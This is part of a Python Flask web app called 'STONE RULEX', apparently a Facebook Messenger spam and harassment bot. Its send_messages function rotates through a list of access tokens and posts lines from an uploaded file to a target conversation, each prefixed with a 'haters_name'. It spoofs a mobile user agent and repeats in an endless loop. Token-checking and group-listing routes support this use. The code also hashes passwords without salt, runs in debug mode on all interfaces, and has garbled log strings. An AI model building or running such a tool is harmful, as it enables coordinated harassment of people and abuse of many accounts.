                    div.innerHTML = `<h4>Found ${data.groups.length} Messenger Groups:</h4>`;
                    
                    data.groups.forEach(group => {
                        const groupDiv = document.createElement('div');
                        groupDiv.className = 'group-item';
                        groupDiv.innerHTML = `
                            <div class="group-name">${group.name}</div>
                            <div class="group-uid">UID: ${group.uid}</div>
                        `;
                        div.appendChild(groupDiv);
                    });
                    
                    resultsContainer.appendChild(div);
                } else {
                    const div = document.createElement('div');
                    div.className = 'result-item result-invalid';
                    div.innerHTML = `<strong>Error:</strong> ${data.message}`;
                    resultsContainer.appendChild(div);
                }
            })
            .catch(error => {
                resultsContainer.innerHTML = '<div class="result-item result-invalid">Error fetching groups</div>';
            });
        }
        
        function refreshTasks() {
            fetch('/get_tasks')
            .then(response => response.json())
            .then(data => {
                const tasksContainer = document.getElementById('tasks-container');
                tasksContainer.innerHTML = '';
                
                if (data.tasks.length === 0) {
                    tasksContainer.innerHTML = '<div class="empty-state"><i class="fas fa-clipboard-list"></i><h3>No Active Tasks</h3><p>Start a new bot task to see it here</p></div>';
                    return;
                }
                
                data.tasks.forEach(task => {
                    const taskDiv = document.createElement('div');
                    taskDiv.className = 'task-item';
                    taskDiv.innerHTML = `
                        <div class="task-header">
                            <div class="task-id">Task: ${task.id}</div>
                            <div class="task-status ${task.status === 'running' ? 'status-running' : 'status-stopped'}">
                                ${task.status}
                            </div>
                        </div>
                        <div class="task-info">
                            <div class="task-info-item">
                                <div class="task-info-label">Conversation</div>
                                <div class="task-info-value">${task.convo_uid}</div>
                            </div>
                            <div class="task-info-item">
                                <div class="task-info-label">Prefix</div>
                                <div class="task-info-value">${task.haters_name}</div>
                            </div>
                            <div class="task-info-item">
                                <div class="task-info-label">Started</div>
                                <div class="task-info-value">${task.started_at}</div>
                            </div>
                            <div class="task-info-item">
                                <div class="task-info-label">Token</div>
                                <div class="task-info-value">${task.token_name}</div>
                            </div>
                        </div>
                        <div class="task-buttons">
                            <button onclick="toggleLogs('${task.id}')" class="btn btn-primary">
                                <i class="fas fa-eye"></i> View Logs
                            </button>
                            ${task.status === 'running' ? 
                                `<button onclick="stopTask('${task.id}')" class="btn btn-danger">
                                    <i class="fas fa-stop"></i> Stop Task
                                </button>` : 
                                `<button onclick="removeTask('${task.id}')" class="btn btn-warning">
                                    <i class="fas fa-trash"></i> Remove Task
                                </button>`
                            }
                        </div>
                        <div id="logs-${task.id}" class="log-container"></div>
                    `;
                    tasksContainer.appendChild(taskDiv);
                });
            })
            .catch(error => {
                console.error('Error fetching tasks:', error);
            });
        }
        
        function toggleLogs(taskId) {
            const logContainer = document.getElementById(`logs-${taskId}`);
            
            if (logContainer.classList.contains('show')) {
                logContainer.classList.remove('show');
                return;
            }
            
            // Hide all other log containers
            document.querySelectorAll('.log-container').forEach(container => {
                container.classList.remove('show');
            });
            
            // Show this log container
            logContainer.classList.add('show');
            
            // Fetch logs
            fetch(`/get_logs/${taskId}`)
            .then(response => response.json())
            .then(data => {
                logContainer.innerHTML = '';
                data.logs.forEach(log => {
                    const logEntry = document.createElement('div');
                    logEntry.className = 'log-entry';
                    logEntry.textContent = log;
                    logContainer.appendChild(logEntry);
                });
                
                // Scroll to bottom
                logContainer.scrollTop = logContainer.scrollHeight;
            })
            .catch(error => {
                logContainer.innerHTML = '<div class="log-entry">Error loading logs</div>';
            });
        }
        
        function stopTask(taskId) {
            fetch(`/stop_task/${taskId}`, {method: 'POST'})
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    refreshTasks();
                } else {
                    alert('Error stopping task');
                }
            });
        }
        
        function removeTask(taskId) {
            if (confirm('Are you sure you want to remove this task?')) {
                fetch(`/remove_task/${taskId}`, {method: 'POST'})
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        refreshTasks();
                    } else {
                        alert('Error removing task');
                    }
                });
            }
        }
        
        // Auto-refresh tasks every 30 seconds
        setInterval(function() {
            if (document.getElementById('logs-tab').classList.contains('active')) {
                refreshTasks();
            }
        }, 30000);
        
        // Load tasks on page load
        document.addEventListener('DOMContentLoaded', function() {
            refreshTasks();
        });
    </script>
</body>
</html>
'''

def add_log(task_id, message):
    """Add a log entry for a specific task"""
    global task_logs
    
    if task_id not in task_logs:
        task_logs[task_id] = []
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}"
    task_logs[task_id].append(log_entry)
    
    # Keep only last 1000 log entries per task to prevent memory issues
    if len(task_logs[task_id]) > 1000:
        task_logs[task_id] = task_logs[task_id][-1000:]

def check_token_validity(token):
    """Check if a Facebook token is valid and get user info"""
    try:
        url = f"https://graph.facebook.com/v17.0/me?access_token={token}&fields=name,id,picture"
        response = requests.get(url)
        
        if response.status_code == 200:
            user_data = response.json()
            return {
                'valid': True,
                'message': 'Token is valid',
                'name': user_data.get('name', 'Unknown'),
                'id': user_data.get('id', 'Unknown'),
                'picture': user_data.get('picture', {}).get('data', {}).get('url', None)
            }
        else:
            error_data = response.json()
            return {
                'valid': False,
                'message': f'Invalid token: {error_data.get("error", {}).get("message", "Unknown error")}',
                'name': None,
                'id': None,
                'picture': None
            }
    except Exception as e:
        return {
            'valid': False,
            'message': f'Error checking token: {str(e)}',
            'name': None,
            'id': None,
            'picture': None
        }

def fetch_messenger_groups(token):
    """Fetch messenger groups using the provided token"""
    try:
        # Get user's conversations/threads
        url = f"https://graph.facebook.com/v17.0/me/conversations?access_token={token}&fields=participants,name,id&limit=100"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()
            groups = []
            
            for conversation in data.get('data', []):
                # Check if it's a group (more than 2 participants)
                participants = conversation.get('participants', {}).get('data', [])
                if len(participants) > 2:
                    group_name = conversation.get('name', 'Unnamed Group')
                    group_id = conversation.get('id', '')
                    
                    groups.append({
                        'name': group_name,
                        'uid': group_id
                    })
            
            return {
                'success': True,
                'groups': groups,
                'message': f'Found {len(groups)} groups'
            }
        else:
            error_data = response.json()
            return {
                'success': False,
                'groups': [],
                'message': f'API Error: {error_data.get("error", {}).get("message", "Unknown error")}'
            }
    except Exception as e:
        return {
            'success': False,
            'groups': [],
            'message': f'Error fetching groups: {str(e)}'
        }

def get_token_name(token):
    """Get the name associated with a token for identification"""
    try:
        url = f"https://graph.facebook.com/v17.0/me?access_token={token}&fields=name"
        response = requests.get(url)
        if response.status_code == 200:
            user_data = response.json()
            return user_data.get('name', 'Unknown')
        else:
            return 'Invalid Token'
    except:
        return 'Unknown'

def send_messages(task_id, convo_uid, tokens, message_content, speed, haters_name):
    global stop_flags
    
    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    messages = message_content.splitlines()
    tokens = tokens.splitlines()

    num_messages = len(messages)
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_messages)

    add_log(task_id, f"Starting bot with {num_messages} messages and {num_tokens} tokens")
    add_log(task_id, f"Target conversation: {convo_uid}")
    add_log(task_id, f"Message prefix: {haters_name}")
    add_log(task_id, f"Speed: {speed} seconds between messages")
    
    while task_id in stop_flags and not stop_flags[task_id]:
        try:
            for message_index in range(num_messages):
                if task_id in stop_flags and stop_flags[task_id]:
                    add_log(task_id, "Bot stopped by user")
                    break
                    
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()
                token_name = get_token_name(access_token)

                message = messages[message_index].strip()

                url = f"https://graph.facebook.com/v17.0/t_{convo_uid}/"
                parameters = {'access_token': access_token, 'message': f'{haters_name} {message}'}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    log_msg = f"Ã¢Å“â€¦ Message {message_index + 1}/{num_messages} | Token: {token_name} | Content: {haters_name} {message} | Sent at {current_time}"
                    add_log(task_id, log_msg)
                else:
                    error_info = response.text[:100] if response.text else "Unknown error"
                    log_msg = f"Ã¢ÂÅ’ Failed Message {message_index + 1}/{num_messages} | Token: {token_name} | Error: {error_info} | At {current_time}"
                    add_log(task_id, log_msg)
                time.sleep(speed)

            if task_id in stop_flags and stop_flags[task_id]:
                break
                
            add_log(task_id, "Ã°Å¸â€â€ž All messages sent. Restarting the process...")
        except Exception as e:
            error_msg = f"Ã¢Å¡ Ã¯Â¸Â An error occurred: {e}"
            add_log(task_id, error_msg)
            time.sleep(5) # Wait before retrying on error
    
    # Clean up when task ends
    if task_id in stop_flags:
        del stop_flags[task_id]
    if task_id in message_threads:
        del message_threads[task_id]
    
    add_log(task_id, "Ã°Å¸ÂÂ Bot execution completed")


# Authentication routes
@app.route('/')
def index():
    if 'user_id' not in session:
        return render_template_string(auth_html)
    return render_template_string(html_content)

@app.route('/register', methods=['POST'])
def register():
    username = request.form.get("username")
    password = request.form.get('password')
    confirm_password = request.form.get('confirm_password')
    
    if password != confirm_password:
        flash("Passwords do not match", "error")
        return render_template_string(auth_html)
    
    hashed_password = hashlib.sha256(password.encode()).hexdigest()
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    try:
        c.execute("INSERT INTO users (username, password, approved) VALUES (?, ?, 0)", (username, hashed_password))
        conn.commit()
        flash("Registration successful! Your account is pending admin approval.", "success")
        return render_template_string(auth_html)
    except sqlite3.IntegrityError:
        flash("Username already exists", "error")
        return render_template_string(auth_html)
    finally:
        conn.close()

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    hashed_password = hashlib.sha256(password.encode()).hexdigest()
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT id, username, admin, approved FROM users WHERE username = ? AND password = ?", (username, hashed_password))
    user = c.fetchone()
    conn.close()
    
    if user:
        session['user_id'] = user[0]
        session['user_username'] = user[1]
        session['is_admin'] = bool(user[2])
        session['is_approved'] = bool(user[3])
        return redirect(url_for('index'))
    else:
        flash("Invalid username or password", "error")
        return render_template_string(auth_html)

@app.route('/admin_login', methods=['POST'])
def admin_login():
    username = request.form.get("username")
    password = request.form.get('password')
    hashed_password = hashlib.sha256(password.encode()).hexdigest()
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT id, username, admin, approved FROM users WHERE username = ? AND password = ? AND admin = 1", (username, hashed_password))
    user = c.fetchone()
    conn.close()
    
    if user:
        session['user_id'] = user[0]
        session['user_username'] = user[1]
        session['is_admin'] = bool(user[2])
        session['is_approved'] = bool(user[3])
        return redirect(url_for('index'))
    else:
        flash("Invalid admin credentials", "admin_error")
        return render_template_string(auth_html)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

@app.route('/admin')
@admin_required
def admin_panel():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT id, username, admin, approved, created_at FROM users ORDER BY created_at DESC")
    users = c.fetchall()
    conn.close()
    
    admin_html = '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>STONE RULEX - Admin Panel</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                padding: 20px;
            }
            
            .admin-container {
                background: rgba(255, 255, 255, 0.95);
                backdrop-filter: blur(10px);
                border-radius: 20px;
                box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
                max-width: 1200px;
                margin: 0 auto;
                overflow: hidden;
            }
            
            .admin-header {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 30px;
                text-align: center;
                position: relative;
            }
            
            .admin-header h1 {
                font-size: 2.5rem;
                margin-bottom: 10px;
                text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
            }
            
            .admin-header p {
                font-size: 1.1rem;
                opacity: 0.9;
            }
            
            .back-btn {
                position: absolute;
                top: 20px;
                left: 20px;
                background: rgba(255, 255, 255, 0.2);
                color: white;
                border: none;
                padding: 10px 20px;
                border-radius: 10px;
                text-decoration: none;
                font-weight: 600;
                transition: all 0.3s ease;
            }
            
            .back-btn:hover {
                background: rgba(255, 255, 255, 0.3);
                transform: translateY(-2px);
            }
            
            .admin-content {
                padding: 30px;
            }
            
            .stats-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }
            
            .stat-card {
                background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
                border-radius: 15px;
                padding: 25px;
                text-align: center;
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
                transition: all 0.3s ease;
            }
            
            .stat-card:hover {
                transform: translateY(-5px);
                box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
            }
            
            .stat-icon {
                font-size: 2.5rem;
                margin-bottom: 15px;
                color: #667eea;
            }
            
            .stat-number {
                font-size: 2rem;
                font-weight: 700;
                color: #495057;
                margin-bottom: 5px;
            }
            
            .stat-label {
                color: #6c757d;
                font-weight: 600;
                text-transform: uppercase;
                letter-spacing: 0.5px;
                font-size: 12px;
            }
            
            .user-list {
                margin-top: 20px;
            }
            
            .user-item {
                background: white;
                border: 1px solid #e9ecef;
                border-radius: 15px;
                padding: 20px;
                margin-bottom: 15px;
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
                transition: all 0.3s ease;
            }
            
            .user-item:hover {
                transform: translateY(-2px);
                box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
            }
            
            .user-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 15px;
                flex-wrap: wrap;
            }
            
            .user-username {
                font-size: 1.2rem;
                font-weight: 700;
                color: #495057;
            }
            
            .user-details {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
                gap: 15px;
                margin-bottom: 15px;
            }
            
            .user-detail {
                background: #f8f9fa;
                padding: 10px 15px;
                border-radius: 8px;
                border-left: 4px solid #667eea;
            }
            
            .detail-label {
                font-size: 12px;
                color: #6c757d;
                text-transform: uppercase;
                letter-spacing: 0.5px;
                margin-bottom: 5px;
            }
            
            .detail-value {
                font-weight: 600;
                color: #495057;
            }
            
            .user-actions {
                display: flex;
                gap: 10px;
                flex-wrap: wrap;
            }
            
            .status-badge {
                padding: 8px 16px;
                border-radius: 20px;
                font-size: 12px;
                font-weight: 700;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
            
            .status-admin {
                background: linear-gradient(135deg, #007bff 0%, #6610f2 100%);
                color: white;
            }
            
            .status-approved {
                background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
                color: white;
            }
            
            .status-pending {
                background: linear-gradient(135deg, #ffc107 0%, #fd7e14 100%);
                color: #212529;
            }
            
            .status-revoked {
                background: linear-gradient(135deg, #6c757d 0%, #495057 100%);
                color: white;
            }
            
            .btn {
                padding: 10px 20px;
                border: none;
                border-radius: 8px;
                font-size: 14px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s ease;
                text-transform: uppercase;
                letter-spacing: 0.5px;
                min-width: 120px;
            }
            
            .btn-approve {
                background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
                color: white;
            }
            
            .btn-approve:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(40, 167, 69, 0.3);
            }
            
            .btn-reject {
                background: linear-gradient(135deg, #dc3545 0%, #fd7e14 100%);
                color: white;
            }
            
            .btn-reject:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(220, 53, 69, 0.3);
            }
            
            .btn-revoke {
                background: linear-gradient(135deg, #ffc107 0%, #fd7e14 100%);
                color: #212529;
            }
            
            .btn-revoke:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(255, 193, 7, 0.3);
            }
            
            .btn-remove {
                background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
                color: white;
            }
            
            .btn-remove:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(220, 53, 69, 0.3);
            }
            
            .btn-promote {
                background: linear-gradient(135deg, #007bff 0%, #6610f2 100%);
                color: white;
            }
            
            .btn-promote:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(0, 123, 255, 0.3);
            }
            
            .btn-demote {
                background: linear-gradient(135deg, #6c757d 0%, #495057 100%);
                color: white;
            }
            
            .btn-demote:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(108, 117, 125, 0.3);
            }
            
            .section-title {
                font-size: 1.5rem;
                font-weight: 700;
                color: #495057;
                margin-bottom: 20px;
                padding-bottom: 10px;
                border-bottom: 2px solid #e9ecef;
            }
            
            @media (max-width: 768px) {
                .admin-header {
                    padding: 20px;
                }
                
                .admin-header h1 {
                    font-size: 2rem;
                }
                
                .back-btn {
                    position: static;
                    margin-bottom: 20px;
                    display: inline-block;
                }
                
                .user-header {
                    flex-direction: column;
                    align-items: flex-start;
                    gap: 10px;
                }
                
                .user-actions {
                    width: 100%;
                }
                
                .btn {
                    flex: 1;
                    min-width: auto;
                }
            }
        </style>
    </head>
    <body>
        <div class="admin-container">
            <div class="admin-header">
                <a href="/" class="back-btn">
                    <i class="fas fa-arrow-left"></i> Back to Dashboard
                </a>
                <h1><i class="fas fa-cog"></i> Admin Panel</h1>
                <p>User Management & System Control</p>
            </div>
            
            <div class="admin-content">
                <div class="stats-grid">
    '''
    
    # Calculate statistics
    total_users = len(users)
    approved_users = len([u for u in users if u[3] == 1])
    pending_users = len([u for u in users if u[3] == 0])
    admin_users = len([u for u in users if u[2] == 1])
    
    admin_html += f'''
                    <div class="stat-card">
                        <div class="stat-icon"><i class="fas fa-users"></i></div>
                        <div class="stat-number">{total_users}</div>
                        <div class="stat-label">Total Users</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-icon"><i class="fas fa-check-circle"></i></div>
                        <div class="stat-number">{approved_users}</div>
                        <div class="stat-label">Approved</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-icon"><i class="fas fa-clock"></i></div>
                        <div class="stat-number">{pending_users}</div>
                        <div class="stat-label">Pending</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-icon"><i class="fas fa-crown"></i></div>
                        <div class="stat-number">{admin_users}</div>
                        <div class="stat-label">Admins</div>
                    </div>
                </div>
                
                <h2 class="section-title">
                    <i class="fas fa-users-cog"></i> User Management
                </h2>
                
                <div class="user-list">
    '''
    
    for user in users:
        user_id, username, admin, approved, created_at = user
        admin_html += f'''
        <div class="user-item">
            <div class="user-header">
                <div class="user-username">{username}</div>
                <div class="status-badge {'status-admin' if admin else ('status-approved' if approved else 'status-pending')}">
                    {'Admin' if admin else ('Approved' if approved else 'Pending')}
                </div>
            </div>
            <div class="user-details">
                <div class="user-detail">
                    <div class="detail-label">User ID</div>
                    <div class="detail-value">#{user_id}</div>
                </div>
                <div class="user-detail">
                    <div class="detail-label">Registered</div>
                    <div class="detail-value">{created_at}</div>
                </div>
                <div class="user-detail">
                    <div class="detail-label">Status</div>
                    <div class="detail-value">{'Administrator' if admin else ('Active User' if approved else 'Awaiting Approval')}</div>
                </div>
            </div>
            <div class="user-actions">
        '''
        
        # Don't allow modifying the main admin account (first admin)
        if username != 'the_stone_rulex':
            if not approved and not admin:
                # Pending user - show approve/reject buttons
                admin_html += f'''
                <button class="btn btn-approve" onclick="approveUser({user_id})">
                    <i class="fas fa-check"></i> Approve
                </button>
                <button class="btn btn-reject" onclick="rejectUser({user_id})">
                    <i class="fas fa-times"></i> Reject
                </button>
                '''
            
            if approved and not admin:
                # Approved user - show revoke, remove, and promote buttons
                admin_html += f'''
                <button class="btn btn-revoke" onclick="revokeUser({user_id})">
                    <i class="fas fa-ban"></i> Revoke
                </button>
                <button class="btn btn-remove" onclick="removeUser({user_id})">
                    <i class="fas fa-trash"></i> Remove
                </button>
                <button class="btn btn-promote" onclick="promoteUser({user_id})">
                    <i class="fas fa-crown"></i> Make Admin
                </button>
                '''
            elif admin:
                # Admin user - show demote and remove buttons
                admin_html += f'''
                <button class="btn btn-demote" onclick="demoteUser({user_id})">
                    <i class="fas fa-user"></i> Remove Admin
                </button>
                <button class="btn btn-remove" onclick="removeUser({user_id})">
                    <i class="fas fa-trash"></i> Remove
                </button>
                '''
        else:
            admin_html += '<span style="color: #6c757d; font-style: italic;">Main Administrator</span>'
        
        admin_html += '''
            </div>
        </div>
        '''
    
    admin_html += '''
                </div>
            </div>
        </div>
        
        <script>
            function approveUser(userId) {
                if (confirm('Approve this user?')) {
                    fetch(`/admin/approve/${userId}`, {method: 'POST'})
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            location.reload();
                        } else {
                            alert('Error approving user');
                        }
                    });
                }
            }
            
            function rejectUser(userId) {
                if (confirm('Reject and delete this user account?')) {
                    fetch(`/admin/reject/${userId}`, {method: 'POST'})
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            location.reload();
                        } else {
                            alert('Error rejecting user');
                        }
                    });
                }
            }
            
            function revokeUser(userId) {
                if (confirm('Revoke access for this user? They will need to be re-approved to access the system.')) {
                    fetch(`/admin/revoke/${userId}`, {method: 'POST'})
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            location.reload();
                        } else {
                            alert('Error revoking user access');
                        }
                    });
                }
            }
            
            function removeUser(userId) {
                if (confirm('Permanently remove this user account? This action cannot be undone.')) {
                    fetch(`/admin/remove/${userId}`, {method: 'POST'})
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            location.reload();
                        } else {
                            alert('Error removing user');
                        }
                    });
                }
            }
            
            function promoteUser(userId) {
                if (confirm('Promote this user to admin?')) {
                    fetch(`/admin/promote/${userId}`, {method: 'POST'})
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            location.reload();
                        } else {
                            alert('Error promoting user');
                        }
                    });
                }
            }
            
            function demoteUser(userId) {
                if (confirm('Remove admin privileges from this user?')) {
                    fetch(`/admin/demote/${userId}`, {method: 'POST'})
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            location.reload();
                        } else {
                            alert('Error demoting user');
                        }
                    });
                }
            }
        </script>
    </body>
    </html>
    '''
    
    return admin_html

# Enhanced admin routes with revoke and remove functionality
@app.route('/admin/approve/<int:user_id>', methods=['POST'])
@admin_required
def approve_user(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("UPDATE users SET approved = 1 WHERE id = ?", (user_id,))
    conn.commit()
    conn.close()
    return jsonify({'success': True})

@app.route('/admin/reject/<int:user_id>', methods=['POST'])
@admin_required
def reject_user(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("DELETE FROM users WHERE id = ?", (user_id,))
    conn.commit()
    conn.close()
    return jsonify({'success': True})

@app.route('/admin/revoke/<int:user_id>', methods=['POST'])
@admin_required
def revoke_user(user_id):
    """Revoke user access by setting approved status to 0"""
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    # Check if user exists and is not the main admin
    c.execute("SELECT username, admin FROM users WHERE id = ?", (user_id,))
    user = c.fetchone()
    
    if user and user[0] != 'the_stone_rulex':  # Don't allow revoking main admin
        c.execute("UPDATE users SET approved = 0 WHERE id = ?", (user_id,))
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    else:
        conn.close()
        return jsonify({'success': False, 'message': 'Cannot revoke main admin or user not found'})

@app.route('/admin/remove/<int:user_id>', methods=['POST'])
@admin_required
def remove_user(user_id):
    """Permanently remove a user account"""
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    # Check if user exists and is not the main admin
    c.execute("SELECT username FROM users WHERE id = ?", (user_id,))
    user = c.fetchone()
    
    if user and user[0] != 'the_stone_rulex':  # Don't allow removing main admin
        c.execute("DELETE FROM users WHERE id = ?", (user_id,))
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    else:
        conn.close()
        return jsonify({'success': False, 'message': 'Cannot remove main admin or user not found'})

@app.route('/admin/promote/<int:user_id>', methods=['POST'])
@admin_required
def promote_user(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("UPDATE users SET admin = 1, approved = 1 WHERE id = ?", (user_id,))
    conn.commit()
    conn.close()
    return jsonify({'success': True})

@app.route('/admin/demote/<int:user_id>', methods=['POST'])
@admin_required
def demote_user(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    # Check if user is not the main admin
    c.execute("SELECT username FROM users WHERE id = ?", (user_id,))
    user = c.fetchone()
    
    if user and user[0] != 'the_stone_rulex':  # Don't allow demoting main admin
        c.execute("UPDATE users SET admin = 0 WHERE id = ?", (user_id,))
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    else:
        conn.close()
        return jsonify({'success': False, 'message': 'Cannot demote main admin'})


# Bot functionality routes
@app.route('/run_bot', methods=['POST'])
@approved_required
def run_bot():
    global message_threads, stop_flags

    convo_uid = request.form['convo_uid']
    token = request.form['token']
    speed = int(request.form['speed'])
    haters_name = request.form['haters_name']

    message_file = request.files['message_file']
    message_content = message_file.read().decode('utf-8')

    # Generate unique task ID
    task_id = str(uuid.uuid4())[:8]
    
    # Get token name for display
    first_token = token.splitlines()[0].strip() if token.splitlines() else ""
    token_name = get_token_name(first_token)
    
    # Initialize task
    stop_flags[task_id] = False
    message_threads[task_id] = {
        'user_id': session['user_id'],
        'thread': threading.Thread(target=send_messages, args=(task_id, convo_uid, token, message_content, speed, haters_name)),
        'convo_uid': convo_uid,
        'haters_name': haters_name,
        'started_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'status': 'running',
        'token_name': token_name
    }
    
    message_threads[task_id]['thread'].daemon = True
    message_threads[task_id]['thread'].start()

    add_log(task_id, f"Ã°Å¸Å¡â‚¬ Bot started successfully for task {task_id}")
    add_log(task_id, f"Primary token: {token_name}")
    return redirect(url_for('index'))

@app.route('/stop_task/<task_id>', methods=['POST'])
@approved_required
def stop_task(task_id):
    global stop_flags, message_threads
    
    user_id = session.get("user_id")
    if not user_id:
        return jsonify({"status": "error", "message": "Unauthorized"})
    
    # Check if the task belongs to the current user
    if task_id not in message_threads or message_threads[task_id].get("user_id") != user_id:
        return jsonify({"status": "error", "message": "Task not found or unauthorized"})
    
    if task_id in stop_flags:
        stop_flags[task_id] = True
        add_log(task_id, "Ã°Å¸â€ºâ€˜ Stop signal sent by user")
        
        # Update status in message_threads
        if task_id in message_threads:
            message_threads[task_id]['status'] = 'stopped'
        
    return jsonify({'status': 'success'})

@app.route('/remove_task/<task_id>', methods=['POST'])
@approved_required
def remove_task(task_id):
    global stop_flags, message_threads, task_logs
    
    user_id = session.get("user_id")
    if not user_id:
        return jsonify({"status": "error", "message": "Unauthorized"})
    
    # Check if the task belongs to the current user
    if task_id not in message_threads or message_threads[task_id].get("user_id") != user_id:
        return jsonify({"status": "error", "message": "Task not found or unauthorized"})
    
    # Clean up all references to the task
    if task_id in message_threads:
        del message_threads[task_id]
    if task_id in task_logs:
        del task_logs[task_id]
    if task_id in stop_flags:
        del stop_flags[task_id]
        
    return jsonify({'status': 'success'})

@app.route('/check_tokens', methods=['POST'])
@approved_required
def check_tokens():
    data = request.json
    tokens = data.get('tokens', [])
    
    results = []
    for token in tokens:
        if token.strip():  # Only check non-empty tokens
            result = check_token_validity(token.strip())
            result['token'] = token.strip()
            results.append(result)
    
    return jsonify({'results': results})

@app.route('/fetch_groups', methods=['POST'])
@approved_required
def fetch_groups():
    data = request.json
    token = data.get('token', '').strip()
    
    if not token:
        return jsonify({'success': False, 'groups': [], 'message': 'No token provided'})
    
    result = fetch_messenger_groups(token)
    return jsonify(result)

@app.route('/get_tasks')
@approved_required
def get_tasks():
    global message_threads
    
    tasks = []
    user_id = session.get("user_id")
    if not user_id:
        return jsonify({"tasks": []})

    for task_id, task_info in message_threads.items():
        if task_info.get("user_id") != user_id:
            continue
        # Check if thread is still alive
        if task_info['thread'].is_alive():
            status = 'running'
        else:
            status = 'stopped'
            
        # Update status in the task_info
        task_info['status'] = status
        
        tasks.append({
            'id': task_id,
            'convo_uid': task_info['convo_uid'],
            'haters_name': task_info['haters_name'],
            'started_at': task_info['started_at'],
            'status': status,
            'token_name': task_info['token_name']
        })
    
    return jsonify({'tasks': tasks})

@app.route('/get_logs/<task_id>')
@approved_required
def get_logs(task_id):
    global task_logs
    
    user_id = session.get("user_id")
    if not user_id:
        return jsonify({"logs": []})
    
    # Check if the task belongs to the current user
    if task_id not in message_threads or message_threads[task_id].get("user_id") != user_id:
        return jsonify({"logs": []})
    
    logs = task_logs.get(task_id, [])
    return jsonify({'logs': logs})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
